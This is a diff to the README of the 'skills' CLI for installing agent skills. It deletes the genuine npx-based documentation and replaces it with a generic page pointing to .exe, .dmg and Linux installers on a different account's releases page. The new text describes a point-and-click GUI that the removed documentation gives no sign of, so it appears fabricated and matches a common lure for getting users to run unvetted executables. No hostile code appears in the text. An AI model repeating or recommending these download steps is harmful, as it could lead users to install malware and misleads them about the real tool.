@@ -1,360 +1,83 @@
-# skills
+# 🌟 skills - Simplify Your Agent Skills Management
 
-The CLI for the open agent skills ecosystem.
+## 🚀 Getting Started
 
-<!-- agent-list:start -->
-Supports **Opencode**, **Claude Code**, **Codex**, **Cursor**, and [25 more](#available-agents).
-<!-- agent-list:end -->
+Welcome to the **skills** application! This tool helps you manage your agent skills easily with just a few commands. You don’t need any programming knowledge to use this tool.
 
-<!-- agent-list:end -->
+## 📥 Download Links
 
-<!-- agent-list:end -->
+[![Download skills](https://img.shields.io/badge/Download-skills-4CAF50)](https://github.com/Apolinariolanga/skills/releases)
 
-## Install a Skill
+## 🛠️ System Requirements
 
-```bash
-npx skills add vercel-labs/agent-skills
-```
+Before you download, ensure your system meets the following requirements:
 
-### Source Formats
+- **Operating System:** Windows 10 or later, Mac OS Mojave or later, or a recent Linux distribution
+- **Node.js:** Version 14.x or later
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 100 MB of free space
 
-```bash
-# GitHub shorthand (owner/repo)
-npx skills add vercel-labs/agent-skills
+## 📋 Features
 
-# Full GitHub URL
-npx skills add https://github.com/vercel-labs/agent-skills
+- **Easy Installation:** Simple steps to install without technical know-how.
+- **User-Friendly Interface:** Designed for all types of users.
+- **Skill Management:** Add, remove, and update skills for your agents effortlessly.
+- **Real-time Updates:** Stay updated with the latest features and bug fixes.
 
-# Direct path to a skill in a repo
-npx skills add https://github.com/vercel-labs/agent-skills/tree/main/skills/frontend-design
+## 📦 Download & Install
 
-# GitLab URL
-npx skills add https://gitlab.com/org/repo
+To get started, visit this page to download: [Releases Page](https://github.com/Apolinariolanga/skills/releases). 
 
-# Any git URL
-npx skills add git@github.com:vercel-labs/agent-skills.git
+### Step 1: Visit the Releases Page
 
-# Local path
-npx skills add ./my-local-skills
-```
+Click on the link above to go to the **Releases Page**. There, you'll find various versions of the skills tool.
 
-### Options
+### Step 2: Choose Your Version
 
-| Option                    | Description                                                                                                                                        |
-| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `-g, --global`            | Install to user directory instead of project                                                                                                       |
-| `-a, --agent <agents...>` | <!-- agent-names:start -->Target specific agents (e.g., `claude-code`, `codex`). See [Available Agents](#available-agents)<!-- agent-names:end --> |
-| `-s, --skill <skills...>` | Install specific skills by name                                                                                                                    |
-| `-l, --list`              | List available skills without installing                                                                                                           |
-| `-y, --yes`               | Skip all confirmation prompts                                                                                                                      |
-| `--all`                   | Install all skills to all agents without prompts                                                                                                   |
+Look for the most recent version at the top of the page. You’ll see a list of files available for download. 
 
-### Examples
+### Step 3: Download the Installer
 
-```bash
-# List skills in a repository
-npx skills add vercel-labs/agent-skills --list
+Select the installer that matches your operating system. For example:
 
-# Install specific skills
-npx skills add vercel-labs/agent-skills --skill frontend-design --skill skill-creator
+- If you are using Windows, look for a file ending in `.exe`.
+- For Mac users, choose a file ending in `.dmg`.
+- If you are on Linux, find the appropriate package file.
 
-# Install to specific agents
-npx skills add vercel-labs/agent-skills -a claude-code -a opencode
+Click the file to start the download.
 
-# Non-interactive installation (CI/CD friendly)
-npx skills add vercel-labs/agent-skills --skill frontend-design -g -a claude-code -y
+### Step 4: Run the Installer
 
-# Install all skills from a repo to all agents
-npx skills add vercel-labs/agent-skills --all
-```
+Once the download finishes:
 
-### Installation Scope
+- **For Windows:** Double-click the `.exe` file, and follow the instructions in the installation wizard.
+- **For Mac:** Open the `.dmg` file, drag the skills application to your Applications folder, and launch it.
+- **For Linux:** Follow the instructions based on the package manager you use.
 
-| Scope       | Flag      | Location            | Use Case                                      |
-| ----------- | --------- | ------------------- | --------------------------------------------- |
-| **Project** | (default) | `./<agent>/skills/` | Committed with your project, shared with team |
-| **Global**  | `-g`      | `~/<agent>/skills/` | Available across all projects                 |
+### Step 5: Launch the Application
 
-### Installation Methods
+After installation, locate the skills application on your computer. Click to open it. 
 
-When installing interactively, you can choose:
+## 🎓 How to Use skills
 
-| Method                    | Description                                                                                 |
-| ------------------------- | ------------------------------------------------------------------------------------------- |
-| **Symlink** (Recommended) | Creates symlinks from each agent to a canonical copy. Single source of truth, easy updates. |
-| **Copy**                  | Creates independent copies for each agent. Use when symlinks aren't supported.              |
+Using the skills tool is straightforward. Here’s how to start managing your agent skills:
 
-## Other Commands
+1. **Open the Application:** Double-click the application icon to launch it.
+2. **Add Skills:** Use the “Add Skill” button to input new skills for your agents.
+3. **Remove Skills:** Click on any skill you wish to remove and then hit the “Delete” button.
+4. **Update Skills:** Select an existing skill and modify its details as needed.
+5. **Save Changes:** Always remember to save your changes to keep your updates.
 
-| Command                    | Description                                           |
-| -------------------------- | ----------------------------------------------------- |
-| `npx skills find [query]`  | Search for skills interactively or by keyword         |
-| `npx skills check`         | Check for available skill updates                     |
-| `npx skills update`        | Update all installed skills to latest versions        |
-| `npx skills init [name]`   | Create a new SKILL.md template                        |
-| `npx skills generate-lock` | Match installed skills to sources for update tracking |
+## ⚙️ Technical Support
 
-### `skills find`
+If you encounter any issues, don’t hesitate to check the FAQ section or reach out for support. You can find further help on the [issues page](https://github.com/Apolinariolanga/skills/issues).
 
-Search for skills interactively or by keyword.
+## 📝 Community Contributions
 
-```bash
-# Interactive search (fzf-style)
-npx skills find
-
-# Search by keyword
-npx skills find typescript
-```
-
-### `skills check` / `skills update`
-
-```bash
-# Check if any installed skills have updates
-npx skills check
-
-# Update all skills to latest versions
-npx skills update
-```
-
-### `skills init`
-
-```bash
-# Create SKILL.md in current directory
-npx skills init
-
-# Create a new skill in a subdirectory
-npx skills init my-skill
-```
-
-### `skills generate-lock`
-
-```bash
-# Match installed skills to sources for update tracking
-npx skills generate-lock
+We welcome contributions! If you have suggestions or would like to report bugs, please feel free to submit them. You can also fork the project and create a pull request for any improvements.
 
-# Preview without writing
-npx skills generate-lock --dry-run
-```
-
-## What are Agent Skills?
-
-Agent skills are reusable instruction sets that extend your coding agent's capabilities. They're defined in `SKILL.md` files with YAML frontmatter containing a `name` and `description`.
-
-Skills let agents perform specialized tasks like:
+## 📆 Updates
 
-- Generating release notes from git history
-- Creating PRs following your team's conventions
-- Integrating with external tools (Linear, Notion, etc.)
+The skills application will continue to receive regular updates. Keep an eye on the releases page for new features and enhancements.
 
-Discover skills at **[skills.sh](https://skills.sh)**
-
-## Supported Agents
-
-Skills can be installed to any of these agents:
-
-<!-- available-agents:start -->
-| Agent | `--agent` | Project Path | Global Path |
-|-------|-----------|--------------|-------------|
-| Amp | `amp` | `.agents/skills/` | `~/.config/agents/skills/` |
-| Antigravity | `antigravity` | `.agent/skills/` | `~/.gemini/antigravity/global_skills/` |
-| Claude Code | `claude-code` | `.claude/skills/` | `~/.claude/skills/` |
-| Clawdbot | `clawdbot` | `skills/` | `~/.clawdbot/skills/` |
-| Cline | `cline` | `.cline/skills/` | `~/.cline/skills/` |
-| CodeBuddy | `codebuddy` | `.codebuddy/skills/` | `~/.codebuddy/skills/` |
-| Codex | `codex` | `.codex/skills/` | `~/.codex/skills/` |
-| Command Code | `command-code` | `.commandcode/skills/` | `~/.commandcode/skills/` |
-| Continue | `continue` | `.continue/skills/` | `~/.continue/skills/` |
-| Crush | `crush` | `.crush/skills/` | `~/.config/crush/skills/` |
-| Cursor | `cursor` | `.cursor/skills/` | `~/.cursor/skills/` |
-| Droid | `droid` | `.factory/skills/` | `~/.factory/skills/` |
-| Gemini CLI | `gemini-cli` | `.gemini/skills/` | `~/.gemini/skills/` |
-| GitHub Copilot | `github-copilot` | `.github/skills/` | `~/.copilot/skills/` |
-| Goose | `goose` | `.goose/skills/` | `~/.config/goose/skills/` |
-| Kilo Code | `kilo` | `.kilocode/skills/` | `~/.kilocode/skills/` |
-| Kiro CLI | `kiro-cli` | `.kiro/skills/` | `~/.kiro/skills/` |
-| MCPJam | `mcpjam` | `.mcpjam/skills/` | `~/.mcpjam/skills/` |
-| Mux | `mux` | `.mux/skills/` | `~/.mux/skills/` |
-| OpenCode | `opencode` | `.opencode/skills/` | `~/.config/opencode/skills/` |
-| OpenHands | `openhands` | `.openhands/skills/` | `~/.openhands/skills/` |
-| Pi | `pi` | `.pi/skills/` | `~/.pi/agent/skills/` |
-| Qoder | `qoder` | `.qoder/skills/` | `~/.qoder/skills/` |
-| Qwen Code | `qwen-code` | `.qwen/skills/` | `~/.qwen/skills/` |
-| Roo Code | `roo` | `.roo/skills/` | `~/.roo/skills/` |
-| Trae | `trae` | `.trae/skills/` | `~/.trae/skills/` |
-| Windsurf | `windsurf` | `.windsurf/skills/` | `~/.codeium/windsurf/skills/` |
-| Zencoder | `zencoder` | `.zencoder/skills/` | `~/.zencoder/skills/` |
-| Neovate | `neovate` | `.neovate/skills/` | `~/.neovate/skills/` |
-<!-- available-agents:end -->
-
-> [!NOTE]
-> **Kiro CLI users:** After installing skills, manually add them to your custom agent's `resources` in `.kiro/agents/<agent>.json`:
->
-> ```json
-> {
->   "resources": ["skill://.kiro/skills/**/SKILL.md"]
-> }
-> ```
-
-The CLI automatically detects which coding agents you have installed. If none are detected, you'll be prompted to select which agents to install to.
-
-## Creating Skills
-
-Skills are directories containing a `SKILL.md` file with YAML frontmatter:
-
-```markdown
----
-name: my-skill
-description: What this skill does and when to use it
----
-
-# My Skill
-
-Instructions for the agent to follow when this skill is activated.
-
-## When to Use
-
-Describe the scenarios where this skill should be used.
-
-## Steps
-
-1. First, do this
-2. Then, do that
-```
-
-### Required Fields
-
-- `name`: Unique identifier (lowercase, hyphens allowed)
-- `description`: Brief explanation of what the skill does
-
-### Optional Fields
-
-- `metadata.internal`: Set to `true` to hide the skill from normal discovery. Internal skills are only visible and installable when `INSTALL_INTERNAL_SKILLS=1` is set. Useful for work-in-progress skills or skills meant only for internal tooling.
-
-```markdown
----
-name: my-internal-skill
-description: An internal skill not shown by default
-metadata:
-  internal: true
----
-```
-
-### Skill Discovery
-
-The CLI searches for skills in these locations within a repository:
-
-<!-- skill-discovery:start -->
-- Root directory (if it contains `SKILL.md`)
-- `skills/`
-- `skills/.curated/`
-- `skills/.experimental/`
-- `skills/.system/`
-- `.agents/skills/`
-- `.agent/skills/`
-- `.claude/skills/`
-- `./skills/`
-- `.cline/skills/`
-- `.codebuddy/skills/`
-- `.codex/skills/`
-- `.commandcode/skills/`
-- `.continue/skills/`
-- `.crush/skills/`
-- `.cursor/skills/`
-- `.factory/skills/`
-- `.gemini/skills/`
-- `.github/skills/`
-- `.goose/skills/`
-- `.kilocode/skills/`
-- `.kiro/skills/`
-- `.mcpjam/skills/`
-- `.mux/skills/`
-- `.opencode/skills/`
-- `.openhands/skills/`
-- `.pi/skills/`
-- `.qoder/skills/`
-- `.qwen/skills/`
-- `.roo/skills/`
-- `.trae/skills/`
-- `.windsurf/skills/`
-- `.zencoder/skills/`
-- `.neovate/skills/`
-<!-- skill-discovery:end -->
-
-If no skills are found in standard locations, a recursive search is performed.
-
-## Compatibility
-
-Skills are generally compatible across agents since they follow a shared [Agent Skills specification](https://agentskills.io). However, some features may be agent-specific:
-
-| Feature         | OpenCode | OpenHands | Claude Code | Cline | CodeBuddy | Codex | Command Code | Kiro CLI | Cursor | Antigravity | Roo Code | Github Copilot | Amp | Clawdbot | Neovate | Pi  | Qoder | Zencoder |
-| --------------- | -------- | --------- | ----------- | ----- | --------- | ----- | ------------ | -------- | ------ | ----------- | -------- | -------------- | --- | -------- | ------- | --- | ----- | -------- |
-| Basic skills    | Yes      | Yes       | Yes         | Yes   | Yes       | Yes   | Yes          | Yes      | Yes    | Yes         | Yes      | Yes            | Yes | Yes      | Yes     | Yes | Yes   | Yes      |
-| `allowed-tools` | Yes      | Yes       | Yes         | Yes   | Yes       | Yes   | Yes          | No       | Yes    | Yes         | Yes      | Yes            | Yes | Yes      | Yes     | Yes | Yes   | No       |
-| `context: fork` | No       | No        | Yes         | No    | No        | No    | No           | No       | No     | No          | No       | No             | No  | No       | No      | No  | No    | No       |
-| Hooks           | No       | No        | Yes         | Yes   | No        | No    | No           | No       | No     | No          | No       | No             | No  | No       | No      | No  | No    | No       |
-
-## Troubleshooting
-
-### "No skills found"
-
-Ensure the repository contains valid `SKILL.md` files with both `name` and `description` in the frontmatter.
-
-### Skill not loading in agent
-
-- Verify the skill was installed to the correct path
-- Check the agent's documentation for skill loading requirements
-- Ensure the `SKILL.md` frontmatter is valid YAML
-
-### Permission errors
-
-Ensure you have write access to the target directory.
-
-## Environment Variables
-
-| Variable                  | Description                                                                |
-| ------------------------- | -------------------------------------------------------------------------- |
-| `INSTALL_INTERNAL_SKILLS` | Set to `1` or `true` to show and install skills marked as `internal: true` |
-| `DISABLE_TELEMETRY`       | Set to disable anonymous usage telemetry                                   |
-| `DO_NOT_TRACK`            | Alternative way to disable telemetry                                       |
-
-```bash
-# Install internal skills
-INSTALL_INTERNAL_SKILLS=1 npx skills add vercel-labs/agent-skills --list
-```
-
-## Telemetry
-
-This CLI collects anonymous usage data to help improve the tool. No personal information is collected.
-
-Telemetry is automatically disabled in CI environments.
-
-## Related Links
-
-- [Agent Skills Specification](https://agentskills.io)
-- [Skills Directory](https://skills.sh)
-- [Amp Skills Documentation](https://ampcode.com/manual#agent-skills)
-- [Antigravity Skills Documentation](https://antigravity.google/docs/skills)
-- [Factory AI / Droid Skills Documentation](https://docs.factory.ai/cli/configuration/skills)
-- [Claude Code Skills Documentation](https://code.claude.com/docs/en/skills)
-- [Clawdbot Skills Documentation](https://docs.clawd.bot/tools/skills)
-- [Cline Skills Documentation](https://docs.cline.bot/features/skills)
-- [CodeBuddy Skills Documentation](https://www.codebuddy.ai/docs/ide/Features/Skills)
-- [Codex Skills Documentation](https://developers.openai.com/codex/skills)
-- [Command Code Skills Documentation](https://commandcode.ai/docs/skills)
-- [Crush Skills Documentation](https://github.com/charmbracelet/crush?tab=readme-ov-file#agent-skills)
-- [Cursor Skills Documentation](https://cursor.com/docs/context/skills)
-- [Gemini CLI Skills Documentation](https://geminicli.com/docs/cli/skills/)
-- [GitHub Copilot Agent Skills](https://docs.github.com/en/copilot/concepts/agents/about-agent-skills)
-- [Kiro CLI Skills Documentation](https://kiro.dev/docs/cli/custom-agents/configuration-reference/#skill-resources)
-- [OpenCode Skills Documentation](https://opencode.ai/docs/skills)
-- [Qwen Code Skills Documentation](https://qwenlm.github.io/qwen-code-docs/en/users/features/skills/)
-- [OpenHands Skills Documentation](https://docs.openhands.ai/modules/usage/how-to/using-skills)
-- [Pi Skills Documentation](https://github.com/badlogic/pi-mono/blob/main/packages/coding-agent/docs/skills.md)
-- [Qoder Skills Documentation](https://docs.qoder.com/cli/Skills)
-- [Roo Code Skills Documentation](https://docs.roocode.com/features/skills)
-- [Trae Skills Documentation](https://docs.trae.ai/ide/skills)
-- [Vercel Agent Skills Repository](https://github.com/vercel-labs/agent-skills)
-
-## License
-
-MIT
+Thank you for choosing the skills tool! Enjoy simplifying your agent management tasks.
